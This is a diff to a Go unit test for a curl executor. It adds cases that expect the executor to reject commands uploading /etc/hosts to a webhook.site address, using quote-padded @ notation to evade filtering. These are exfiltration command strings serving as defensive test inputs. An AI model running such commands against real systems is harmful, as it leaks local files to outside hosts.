@@ -202,7 +202,25 @@ func TestCmdCurlExecutor_Curl(t *testing.T) {
 		{
 			name: "try to upload file using @ notation in data part 3 - should return error",
 			args: args{
+				curlCmd: `curl -X POST -H 'token: abcd' --data ''@/etc/hosts https://webhook.site/2775`,
+			},
+			want:          "",
+			shouldExecute: false,
+			wantErr:       true,
+		},
+		{
+			name: "try to upload file using @ notation in data part 3 - should return error",
+			args: args{
 				curlCmd: `curl -X POST -H 'token: abcd' --data ''''@/etc/hosts https://webhook.site/2775`,
+			},
+			want:          "",
+			shouldExecute: false,
+			wantErr:       true,
+		},
+		{
+			name: "try to upload file using @ notation in data part 3 - should return error",
+			args: args{
+				curlCmd: `curl -X POST -H 'token: abcd' --data ''''''@/etc/hosts https://webhook.site/2775'`,
 			},
 			want:          "",
 			shouldExecute: false,
